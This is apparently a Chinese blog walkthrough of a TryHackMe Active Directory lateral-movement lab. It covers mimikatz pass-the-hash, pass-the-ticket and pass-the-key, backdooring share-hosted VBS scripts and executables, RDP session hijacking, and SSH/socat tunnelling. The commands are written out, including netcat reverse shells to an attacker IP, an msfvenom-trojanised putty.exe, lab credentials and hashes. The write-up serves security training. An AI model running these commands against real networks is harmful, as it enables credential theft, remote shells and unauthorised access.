<p>用户：<a target="_blank" rel="noopener" href="http://ZA.TRYHACKME.COM">ZA.TRYHACKME.COM</a>\t2_felicia.dean</p>
<p>Password：iLov3THM!</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">ssh za\\t2_felicia<span class="hljs-selector-class">.dean</span><span class="hljs-keyword">@thmjmp</span>2.za.tryhackme.com<br></code></pre></td></tr></table></figure>
<p>这些凭据将授予您对 THMJMP2 的管理访问权限，允许您使用 mimikatz 转储执行此任务期间提供的任何技术所需的身份验证材料。</p>
<p>使用 SSH 会话，使用 mimikatz 提取身份验证材料并针对域用户 <code>t1_toby.beck</code> 执行 Pass-the-Hash、Pass-the-Ticket 或 Pass-the-Key。</p>
<p>一旦您的命令提示符已加载其凭据，请使用 <code>winrs</code> 连接到 THMIIS 上的命令提示符。由于任何攻击都已将 t1_toby.beck 的凭据注入到您的会话中，因此您可以使用 winrs 而不指定任何凭据，并且它将使用当前会话可用的凭据：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">winrs<span class="hljs-selector-class">.exe</span> -r:THMIIS.za.tryhackme.com cmd<br></code></pre></td></tr></table></figure>
<p>您会在 THMIIS 上 t1_toby.beck 的桌面上找到一个标志。 <code>mimikatz</code> 和 <code>psexec64</code> 均可在 THMJMP2 上的 <code>C:\tools</code> 处获取。</p>
<h3 id="Pass-the-Hash"><a href="#Pass-the-Hash" class="headerlink" title="Pass-the-Hash"></a>Pass-the-Hash</h3>
<p>首先就是获取计算机上用户的哈希值：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs scss">privilege::debug<br>token::elevate<br>lsadump::sam或者sekurlsa::msv //我使用的后者<br></code></pre></td></tr></table></figure>
<p>接着找到目标用户<code>t1_toby.beck</code>对应的hash值，如下图所示</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216162531192.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216162531192.png" alt="image-20240216162531192"></p>
<p>然后，我们可以使用提取的哈希值来执行 PtH 攻击，方法是使用 mimikatz 在反向 shell（或您喜欢的任何其他命令）上为受害者用户注入访问令牌，如下所示：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">mimikatz # token::revert<br>mimikatz # sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /ntlm:<span class="hljs-number">533</span>f1bd576caa912bdb9da284bbc60fe /run:<span class="hljs-string">&quot;c:\tools\nc64.exe -e cmd.exe 10.50.46.236 5555&quot;</span><br></code></pre></td></tr></table></figure>
<p>请注意，我们使用 <code>token::revert</code> 来重新建立原始令牌权限，因为尝试使用提升的令牌传递哈希将不起作用。</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216162901279.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216162901279.png" alt="image-20240216162901279"></p>
<p>成功拿到shell，接着执行如下命令：</p>
<p>一旦您的命令提示符已加载其凭据，请使用 <code>winrs</code> 连接到 THMIIS 上的命令提示符。由于任何攻击都已将 t1_toby.beck 的凭据注入到您的会话中，因此您可以使用 winrs 而不指定任何凭据，并且它将使用当前会话可用的凭据：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">winrs<span class="hljs-selector-class">.exe</span> -r:THMIIS.za.tryhackme.com cmd<br></code></pre></td></tr></table></figure>
<p>您会在 THMIIS 上 t1_toby.beck 的桌面上找到一个标志。 <code>mimikatz</code> 和 <code>psexec64</code> 均可在 THMJMP2 上的 <code>C:\tools</code> 处获取。</p>
<h3 id="Pass-the-Ticket"><a href="#Pass-the-Ticket" class="headerlink" title="Pass-the-Ticket"></a>Pass-the-Ticket</h3>
<p>如果在目标机拥有管理员权限，则可以使用该方法：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">privilege::debug<br>sekurlsa::tickets /export<br></code></pre></td></tr></table></figure>
<p>请注意，如果我们只能访问票证而不能访问其相应的会话密钥，则我们将无法使用该票证；因此，两者都是必要的。</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216163656590.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216163656590.png" alt="image-20240216163656590"></p>
<p>如上图，我们获取到了目标用户的TGT票证。</p>
<p>一旦我们提取了所需的票证，我们就可以使用以下命令将票证注入当前会话：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">mimikatz # kerberos::ptt [<span class="hljs-number">0</span>;cd6dd]-<span class="hljs-number">2</span>-<span class="hljs-number">0</span>-<span class="hljs-number">40</span>e10000-t1_toby<span class="hljs-selector-class">.beck</span><span class="hljs-keyword">@krbtgt-ZA</span>.TRYHACKME.COM.kirbi<br></code></pre></td></tr></table></figure>
<p>在我们自己的会话中注入票证不需要管理员权限。此后，我们用于横向移动的任何工具都可以使用门票。要检查票证是否已正确注入，您可以使用 klist 命令：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216163752957.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216163752957.png" alt="image-20240216163752957"></p>
<p>可以看到我们成功注入会话，成功进入目标用户的shell</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216163905893.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216163905893.png" alt="image-20240216163905893"></p>
<h3 id="Pass-the-Key"><a href="#Pass-the-Key" class="headerlink" title="Pass-the-Key"></a>Pass-the-Key</h3>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">privilege::debug<br>sekurlsa::ekeys<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216164334193.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216164334193.png" alt="image-20240216164334193"></p>
<p>可以看到目标用户可以使用aes256算法以及rc4，这里就用aes256了</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">sekurlsa::pth /user:t1_toby.beck /domain:za.tryhackme.com /aes256:<span class="hljs-number">6</span>a0d48f79acaec013d928d84a102b72028d574340b6139e876e179db48fbde4e /run:<span class="hljs-string">&quot;c:\tools\nc64.exe -e cmd.exe 10.50.46.236 5555&quot;</span><br></code></pre></td></tr></table></figure>
<p>这里也是成功拿到shell，不过恰好靶机重置了，没截到图，这里就算了</p>
<h1>0x06 滥用用户行为</h1>
<p>在某些情况下，攻击者可以利用用户执行的操作来进一步访问网络中的计算机。虽然发生这种情况的方式有很多种，但我们将讨论一些最常见的方式。</p>
<h2 id="滥用可写股份"><a href="#滥用可写股份" class="headerlink" title="滥用可写股份"></a>滥用可写股份</h2>
<p>在检查公司环境时，经常会发现合法用户用来执行日常任务的网络共享。如果这些共享由于某种原因是可写的，攻击者就可以植入特定文件来强制用户执行任意有效负载并获得对其计算机的访问权限。</p>
<p>一种常见的情况是查找网络共享上托管的脚本或可执行文件的快捷方式。</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216165339194.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216165339194.png" alt="image-20240216165339194"></p>
<p>其背后的基本原理是，管理员可以在网络共享上维护可执行文件，并且用户可以执行它，而无需将应用程序复制或安装到每个用户的计算机上。如果我们作为攻击者拥有对此类脚本或可执行文件的写入权限，我们就可以对它们进行后门以强迫用户执行我们想要的任何有效负载。</p>
<p>尽管脚本或可执行文件托管在服务器上，但当用户在其工作站上打开快捷方式时，可执行文件将从服务器复制到其 <code>%temp%</code> 文件夹并在工作站上执行。因此，任何有效负载都将在最终用户工作站（和登录用户帐户）的上下文中运行。</p>
<h3 id="后门-vbs-脚本"><a href="#后门-vbs-脚本" class="headerlink" title="后门-vbs-脚本"></a>后门 .vbs 脚本</h3>
<p>例如，如果共享资源是VBS脚本，我们可以将nc64.exe的副本放在同一个共享上，并在共享脚本中注入以下代码：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">CreateObject</span>(&quot;WScript.Shell&quot;)<span class="hljs-selector-class">.Run</span> &quot;cmd<span class="hljs-selector-class">.exe</span> /c copy /Y \\<span class="hljs-number">10.10</span><span class="hljs-selector-class">.28</span><span class="hljs-selector-class">.6</span>\myshare\nc64<span class="hljs-selector-class">.exe</span> %tmp% &amp; %tmp%\nc64<span class="hljs-selector-class">.exe</span> -e cmd<span class="hljs-selector-class">.exe</span> &lt;attacker_ip&gt; <span class="hljs-number">1234</span>&quot;, <span class="hljs-number">0</span>, True<br></code></pre></td></tr></table></figure>
<p>这会将 nc64.exe 从共享复制到用户工作站 <code>%tmp%</code> 目录，并在用户打开共享 VBS 脚本时向攻击者发送反向 shell。</p>
<h3 id="exe-文件后门"><a href="#exe-文件后门" class="headerlink" title="exe-文件后门"></a>.exe 文件后门</h3>
<p>如果共享文件是 Windows 二进制文件，例如 putty.exe，您可以从共享下载它并使用 msfvenom 向其中注入后门。该二进制文件仍将照常工作，但会静默执行额外的有效负载。要创建后门 putty.exe，我们可以使用以下命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">msfvenom -<span class="hljs-selector-tag">a</span> x64 <span class="hljs-attr">--platform</span> windows -x putty<span class="hljs-selector-class">.exe</span> -k -<span class="hljs-selector-tag">p</span> windows/meterpreter/reverse_tcp lhost=&lt;attacker_ip&gt; lport=<span class="hljs-number">4444</span> -<span class="hljs-selector-tag">b</span> &quot;\x00&quot; -f exe -o puttyX<span class="hljs-selector-class">.exe</span><br></code></pre></td></tr></table></figure>
<p>生成的 puttyX.exe 将在用户没有注意到的情况下执行reverse_tcp meterpreter有效负载。文件生成后，我们可以替换 Windows 共享上的可执行文件，并使用 Metasploit 中的exploit/multi/handler 模块等待任何连接。</p>
<h3 id="RDP劫持"><a href="#RDP劫持" class="headerlink" title="RDP劫持"></a>RDP劫持</h3>
<p>当管理员使用远程桌面连接到计算机并关闭 RDP 客户端而不是注销时，他的会话将无限期地在服务器上保持打开状态。如果您在 Windows Server 2016 及更早版本上拥有系统权限，则无需密码即可接管任何现有 RDP 会话。</p>
<p>如果我们有管理员级别的访问权限，我们可以通过我们喜欢的任何方法获取 SYSTEM。现在，我们将使用 psexec 来执行此操作。首先，让我们以管理员身份运行 cmd.exe：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216165820771.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216165820771.png" alt="image-20240216165820771"></p>
<p>从那里运行 <code>PsExec64.exe</code> （可在 <code>C:\tools\</code> 处获取）：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">PsExec64<span class="hljs-selector-class">.exe</span> -s cmd<span class="hljs-selector-class">.exe</span><br></code></pre></td></tr></table></figure>
<p>要列出服务器上现有的会话，可以使用以下命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; query user<br> USERNAME              SESSIONNAME        ID  STATE   IDLE TIME  LOGON TIME<br>&gt;administrator         rdp-tcp#<span class="hljs-number">6</span>           <span class="hljs-number">2</span>  Active          .  <span class="hljs-number">4</span>/<span class="hljs-number">1</span>/<span class="hljs-number">2022</span> <span class="hljs-number">4</span>:<span class="hljs-number">09</span> AM<br> luke                                    <span class="hljs-number">3</span>  Disc            .  <span class="hljs-number">4</span>/<span class="hljs-number">6</span>/<span class="hljs-number">2022</span> <span class="hljs-number">6</span>:<span class="hljs-number">51</span> AM<br></code></pre></td></tr></table></figure>
<p>根据上面的命令输出，如果我们当前使用管理员用户通过 RDP 连接，我们的 SESSIONNAME 将为 <code>rdp-tcp#6</code> 。我们还可以看到名为 luke 的用户打开了一个 ID 为 <code>3</code> 的会话。任何具有光盘状态的会话都已被用户保持打开状态，并且目前未被使用。虽然您也可以接管活动会话，但当您这样做时，合法用户将被迫退出其会话，他们可能会注意到这一点。</p>
<p>要连接到会话，我们将使用 tscon.exe 并指定我们将接管的会话 ID，以及当前的 SESSIONNAME。按照前面的示例，如果我们以管理员用户身份连接，要接管 luke 的会话，我们将使用以下命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">tscon <span class="hljs-number">3</span> /dest:rdp-tcp#<span class="hljs-number">6</span><br></code></pre></td></tr></table></figure>
<p>简单来说，该命令指出 luke 拥有的图形会话 <code>3</code> 应与管理员用户拥有的 RDP 会话 <code>rdp-tcp#6</code> 连接。</p>
<p>因此，我们将恢复 Luke 的 RDP 会话并立即连接到它。</p>
<p>注意：Windows Server 2019 不允许您在不知道密码的情况下连接到其他用户的会话。</p>
<h2 id="实践练习-4"><a href="#实践练习-4" class="headerlink" title="实践练习-4"></a>实践练习</h2>
<p>要完成此练习，您需要使用从 <a target="_blank" rel="noopener" href="http://distributor.za.tryhackme.com/creds_t2">http://distributor.za.tryhackme.com/creds_t2</a> 获取的一组新凭据连接到 THMJMP2（请注意，此链接与其他任务不同）。获得凭据后，通过 RDP 连接到 THMJMP2：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">xfreerdp /v:thmjmp2.za.tryhackme.com /u:t2_eric.harding /p:Kegq4384<br></code></pre></td></tr></table></figure>
<p>这些凭据将授予您对 THMJMP2 的管理访问权限。</p>
<p>对于此任务，我们将劫持 RDP 会话。如果您有兴趣尝试在 exe 或其他文件中添加后门，您可以在 Windows 本地持久性室中找到一些与此相关的练习。</p>
<p>按照说明劫持 t1_toby.beck 在 THMJMP2 上的 RDP 会话以获取您的标志。</p>
<p>注意：执行 <code>query session</code> 时，您将看到几个名为 t1_toby.beck 的用户，后跟一个数字。这些只是同一用户的相同副本，您可以劫持其中任何一个（您不需要劫持全部）。确保劫持标记为已断开连接的会话（光盘）以避免干扰其他用户。</p>
<p>当我们以管理员打开cmd之后运行如下命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">PsExec64<span class="hljs-selector-class">.exe</span> -s cmd<span class="hljs-selector-class">.exe</span><br></code></pre></td></tr></table></figure>
<p>接着列出服务器上所有的会话：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">query user<br></code></pre></td></tr></table></figure>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216202509233.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216202509233.png" alt="image-20240216202509233"></p>
<p>要连接到会话，我们将使用 tscon.exe 并指定我们将接管的会话 ID，以及当前的 SESSIONNAME。按照前面的示例，如果我们以管理员用户身份连接，要接管 luke 的会话，我们将使用以下命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">tscon <span class="hljs-number">4</span> /dest:rdp-tcp#<span class="hljs-number">27</span><br></code></pre></td></tr></table></figure>
<p>简单来说，该命令指出<code> t1_toby.beck</code> 拥有的图形会话 <code>4</code> 应与管理员用户拥有的 RDP 会话 <code>rdp-tcp#27</code> 连接。</p>
<p>如下图成功窃取到会话</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216202415931.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216202415931.png" alt="image-20240216202415931"></p>
<h1>0x07 端口转发</h1>
<p>我们提出的大多数横向移动技术都需要特定端口可供攻击者使用。在现实网络中，管理员可能出于安全原因阻止了其中一些端口，或者在网络周围实施了分段，从而阻止您访问 SMB、RDP、WinRM 或 RPC 端口。</p>
<p>为了绕过这些限制，我们可以使用端口转发技术，其中包括使用任何受感染的主机作为跳转盒来转向其他主机。预计某些机器将比其他机器拥有更多的网络权限，因为企业中的每个角色在日常工作所需的网络服务方面都有不同的需求。</p>
<h2 id="SSH-隧道"><a href="#SSH-隧道" class="headerlink" title="SSH-隧道"></a>SSH 隧道</h2>
<p>我们要研究的第一个协议是 SSH，因为它已经具有通过称为 SSH 隧道的功能进行端口转发的内置功能。虽然 SSH 曾经是与 Linux 系统相关的协议，但 Windows 现在默认附带 OpenSSH 客户端，因此您可以在当今的许多系统中找到它，而与操作系统无关。</p>
<p>SSH 隧道可以以不同的方式使用，通过 SSH 连接转发端口，我们将根据情况使用它。为了解释每种情况，我们假设一个场景，我们已经获得了对 PC-1 机器的控制权（不需要管理员访问权限），并且希望将其用作访问另一台机器上的端口的枢纽。我们无法直接连接。我们将启动一条从 PC-1 计算机（充当 SSH 客户端）到攻击者 PC（充当 SSH 服务器）的隧道。这样做的原因是，您经常会在 Windows 计算机上找到 SSH 客户端，但大多数时候没有可用的 SSH 服务器。</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216203013265.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216203013265.png" alt="image-20240216203013265"></p>
<p>由于我们将连接回攻击者的计算机，因此我们希望在其中创建一个用户，而无需访问任何隧道控制台，并设置用于创建隧道的密码：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss">useradd tunneluser -m -d /home/tunneluser -s /bin/true<br>passwd tunneluser<br></code></pre></td></tr></table></figure>
<p>根据您的需要，SSH 隧道可用于执行本地或远程端口转发。让我们看一下每个案例。</p>
<h2 id="SSH-远程端口转发"><a href="#SSH-远程端口转发" class="headerlink" title="SSH-远程端口转发"></a>SSH 远程端口转发</h2>
<p>在我们的示例中，假设防火墙策略阻止攻击者的计算机直接访问服务器上的端口 3389。如果攻击者之前已入侵 PC-1，并且 PC-1 可以访问服务器的端口 3389，则可以使用 PC-1 的远程端口转发将其转移到端口 3389。远程端口转发允许您从 SSH 客户端（在本例中为 PC-1）获取可访问的端口，并将其投射到远程 SSH 服务器（攻击者的计算机）中。</p>
<p>结果，攻击者的计算机上将打开一个端口，可用于通过 SSH 隧道连接回服务器中的端口 3389。反过来，PC-1 将代理连接，以便服务器将看到所有流量，就好像它来自 PC-1 一样：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216203227640.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216203227640.png" alt="image-20240216203227640"></p>
<p>此时可能会出现的一个有效问题是，如果我们已经破坏了 PC-1 并且可以直接从那里运行 RDP 会话，为什么我们需要端口转发。答案很简单：在我们只能通过控制台访问 PC-1 的情况下，我们将无法使用任何 RDP 客户端，因为我们没有 GUI。通过使攻击者的计算机可以使用该端口，您可以使用 Linux RDP 客户端进行连接。当您想要针对无法直接访问的端口运行漏洞利用时，会出现类似的情况，因为您的漏洞利用可能需要特定的脚本语言，而这种语言可能并不总是在您妥协的计算机上可用。</p>
<p>参考上图，要将服务器上的端口 3389 转发回攻击者的计算机，我们可以在 PC-1 上使用以下命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; ssh tunneluser@<span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span> -R <span class="hljs-number">3389</span>:<span class="hljs-number">3.3</span>.<span class="hljs-number">3.3</span>:<span class="hljs-number">3389</span> -N<br></code></pre></td></tr></table></figure>
<p>This will establish an SSH session from PC-1 to <code>1.1.1.1</code> (Attacker PC) using the <code>tunneluser</code> user.<br>
这将使用 <code>tunneluser</code> 用户建立从 PC-1 到 <code>1.1.1.1</code> （攻击者 PC）的 SSH 会话。</p>
<p>由于 <code>tunneluser</code> 不允许在攻击者PC上运行shell，因此我们需要使用 <code>-N</code> 开关运行 <code>ssh</code> 命令以防止客户端请求一个，否则连接将立即退出。 <code>-R</code> 开关用于请求远程端口转发，语法要求我们首先指示将在 SSH 服务器上打开的端口 (3389)，后跟冒号，然后是 IP 和端口我们将转发的套接字的名称 (3.3.3.3:3389)。请注意，端口号不需要匹配，但在本示例中需要匹配。</p>
<p>命令本身不会输出任何内容，但隧道将取决于要运行的命令。无论何时，我们都可以像使用任何其他命令一样按 CTRL+C 来关闭隧道。</p>
<p>一旦我们的隧道设置并运行，我们就可以访问攻击者的计算机并通过 RDP 进入转发端口来到达服务器：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">munra<span class="hljs-keyword">@attacker-pc</span>$ xfreerdp /<span class="hljs-attribute">v</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span> /<span class="hljs-attribute">u</span>:MyUser /<span class="hljs-attribute">p</span>:MyPassword<br></code></pre></td></tr></table></figure>
<h2 id="SSH-本地端口转发"><a href="#SSH-本地端口转发" class="headerlink" title="SSH-本地端口转发"></a>SSH 本地端口转发</h2>
<p>本地端口转发允许我们将端口从 SSH 服务器“拉”到 SSH 客户端。在我们的场景中，这可用于获取攻击者计算机中可用的任何服务，并通过 PC-1 上的端口使其可用。这样，任何无法直接连接到攻击者 PC 但可以连接到 PC-1 的主机现在都可以通过枢轴主机访问攻击者的服务。</p>
<p>使用这种类型的端口转发将允许我们从通常无法连接回我们的主机上运行反向 shell，或者仅仅是使我们想要的任何服务对于没有直接连接到我们的机器的机器可用。</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216204345929.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216204345929.png" alt="image-20240216204345929"></p>
<p>要从攻击者的计算机转发端口 80 并使其可从 PC-1 访问，我们可以在 PC-1 上运行以下命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">ssh tunneluser@<span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span> -L *:<span class="hljs-number">80</span>:<span class="hljs-number">127.0</span>.<span class="hljs-number">0.1</span>:<span class="hljs-number">80</span> -N<br></code></pre></td></tr></table></figure>
<p>该命令结构与远程端口转发中使用的命令结构类似，但使用 <code>-L</code> 选项进行本地端口转发。此选项要求我们指示 PC-1 用于接收连接的本地套接字 ( <code>*:80</code> ) 以及从攻击者的 PC 角度连接的远程套接字 ( <code>127.0.0.1:80</code> )。</p>
<p>请注意，我们在第二个套接字中使用 IP 地址 127.0.0.1，从攻击者的 PC 角度来看，这是持有要转发的端口 80 的主机。</p>
<p>由于我们在 PC-1 上打开一个新端口，因此我们可能需要添加防火墙规则以允许传入连接（使用 <code>dir=in</code> ）。为此需要管理权限：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">netsh advfirewall firewall add rule name=&quot;Open Port <span class="hljs-number">80</span>&quot; dir=in action=allow protocol=TCP localport=<span class="hljs-number">80</span><br></code></pre></td></tr></table></figure>
<p>设置隧道后，任何将浏览器指向 <code>http://2.2.2.2:80</code> 的 PC-1 的用户都会看到攻击者计算机发布的网站。</p>
<h2 id="使用-socat-进行端口转发"><a href="#使用-socat-进行端口转发" class="headerlink" title="使用-socat-进行端口转发"></a>使用 socat 进行端口转发</h2>
<p>在 SSH 不可用的情况下，socat 可用于执行类似的功能。虽然不如 SSH 灵活，但 socat 允许您以更简单的方式转发端口。使用 socat 的缺点之一是我们需要将其传输到枢轴主机（在我们当前的示例中为 PC-1），使其比 SSH 更容易被检测到，但在没有其他选项可用的情况下可能值得一试。</p>
<p>使用 socat 执行端口转发的基本语法要简单得多。如果我们想打开主机上的端口 1234 并将我们收到的任何连接转发到主机 1.1.1.1 上的端口 4321，您将使用以下命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">socat TCP4-LISTEN:<span class="hljs-number">1234</span>,fork TCP4:<span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span>:<span class="hljs-number">4321</span><br></code></pre></td></tr></table></figure>
<p><code>fork</code> 选项允许 socat 为收到的每个连接创建一个新进程，从而可以在不关闭的情况下处理多个连接。如果不包含它，socat 将在第一个连接完成时关闭。</p>
<p>回到我们的示例，如果我们想像使用 SSH 远程端口转发一样使用 PC-1 作为枢纽来访问服务器上的端口 3389，我们可以使用以下命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt;socat TCP4-LISTEN:<span class="hljs-number">3389</span>,fork TCP4:<span class="hljs-number">3.3</span>.<span class="hljs-number">3.3</span>:<span class="hljs-number">3389</span><br></code></pre></td></tr></table></figure>
<p>请注意，socat 无法像 SSH 那样将连接直接转发到攻击者的计算机，但会在 PC-1 上打开一个端口，攻击者的计算机随后可以连接到该端口：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216204530374.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216204530374.png" alt="image-20240216204530374"></p>
<p>像往常一样，由于在枢轴主机上打开了一个端口，我们可能需要创建一个防火墙规则以允许到该端口的任何连接：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">netsh advfirewall firewall add rule name=&quot;Open Port <span class="hljs-number">3389</span>&quot; dir=in action=allow protocol=TCP localport=<span class="hljs-number">3389</span><br></code></pre></td></tr></table></figure>
<p>另一方面，如果我们想从攻击者的机器公开端口 80，以便服务器可以访问它，我们只需要稍微调整一下命令：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt;socat TCP4-LISTEN:<span class="hljs-number">80</span>,fork TCP4:<span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span>:<span class="hljs-number">80</span><br></code></pre></td></tr></table></figure>
<p>结果，PC-1 将生成端口 80 并侦听要转发到攻击者计算机上的端口 80 的连接：</p>
<p class='item-img' data-src='https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216204552262.png'><img src="https://gitee.com/he-yi-beichen-star/local_images/raw/master/images/image-20240216204552262.png" alt="image-20240216204552262"></p>
<h2 id="动态端口转发和-SOCKS"><a href="#动态端口转发和-SOCKS" class="headerlink" title="动态端口转发和-SOCKS"></a>动态端口转发和 SOCKS</h2>
<p>虽然单端口转发对于需要访问特定套接字的任务非常有效，但有时我们可能需要通过枢轴主机对主机的许多端口甚至跨多台计算机的许多端口运行扫描。在这些情况下，动态端口转发允许我们通过主机进行旋转，并使用 SOCKS 代理与我们想要的任何 IP 地址/端口建立多个连接。</p>
<p>由于我们不想依赖目标网络中 Windows 计算机上现有的 SSH 服务器，因此我们通常会使用 SSH 客户端通过以下命令建立反向动态端口转发：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">C:\&gt; ssh tunneluser@<span class="hljs-number">1.1</span>.<span class="hljs-number">1.1</span> -R <span class="hljs-number">9050</span> -N<br></code></pre></td></tr></table></figure>
<p>在这种情况下，SSH 服务器将在端口 <code>9050</code> 上启动 SOCKS 代理，并通过 SSH 隧道转发任何连接请求，最终由 SSH 客户端代理。</p>
<p>最有趣的部分是，我们可以使用代理链通过 SOCKS 代理轻松使用我们的任何工具。为此，我们首先需要确保 proxychains 正确配置为将任何连接指向 SOCKS 代理服务器的 SSH 使用的同一端口。 proxychains 配置文件可以在 AttackBox 上的 <code>/etc/proxychains.conf</code> 处找到。如果我们向下滚动到配置文件的末尾，我们应该看到一行指示用于袜子代理的端口：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-selector-attr">[ProxyList]</span><br>socks4  <span class="hljs-number">127.0</span><span class="hljs-selector-class">.0</span><span class="hljs-selector-class">.1</span> <span class="hljs-number">9050</span><br></code></pre></td></tr></table></figure>
<p>默认端口是 9050，但是只要与我们建立 SSH 隧道时使用的端口匹配，任何端口都可以工作。</p>
<p>如果我们现在想通过代理执行任何命令，我们可以使用代理链：</p>
<figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs scss">proxychains curl http://pxeboot.za.tryhackme.com<br></code></pre></td></tr></table></figure>
